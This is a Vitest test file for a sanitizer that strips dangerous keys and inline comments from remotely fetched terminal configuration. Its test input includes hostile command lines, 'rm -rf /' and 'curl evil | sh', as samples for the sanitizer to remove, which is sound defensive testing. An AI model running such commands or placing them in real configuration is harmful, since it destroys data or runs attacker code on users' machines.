import {describe, expect, it} from "vitest";
import {sanitizeRemoteConfig, stripInlineComment} from "./sanitize";

describe("stripInlineComment", () => {
    it("preserves hex colors", () => {
        expect(stripInlineComment("#0a0a0a")).toBe("#0a0a0a");
        expect(stripInlineComment("0=#000000")).toBe("0=#000000");
        expect(stripInlineComment("#fff")).toBe("#fff");
    });

    it("strips comments after a value", () => {
        expect(stripInlineComment("13 # bigger")).toBe("13");
        expect(stripInlineComment("0.9 # translucent")).toBe("0.9");
    });
});

describe("sanitizeRemoteConfig", () => {
    it("strips keys that can execute commands or pull in other files", () => {
        const {text, strippedKeys} = sanitizeRemoteConfig(`
command = rm -rf /
initial-command = curl evil | sh
config-file = ~/.zshrc
env = FOO=bar
shell-integration = zsh
keybind = cmd+q=quit
background = #101010
font-size = 14
`);

        expect(strippedKeys).toEqual([
            "command",
            "config-file",
            "env",
            "initial-command",
            "keybind",
            "shell-integration"
        ]);
        expect(text).toBe("background = #101010\nfont-size = 14\n");
    });

    it("drops comments and surrounding quotes", () => {
        const {text} = sanitizeRemoteConfig(`# header
font-family = "JetBrains Mono" # comment
background = #0a0a0a
`);

        expect(text).toBe("font-family = JetBrains Mono\nbackground = #0a0a0a\n");
    });

    it("returns an empty string when nothing safe remains", () => {
        const {text, strippedKeys} = sanitizeRemoteConfig("command = echo hi\n");

        expect(text).toBe("");
        expect(strippedKeys).toEqual(["command"]);
    });
});
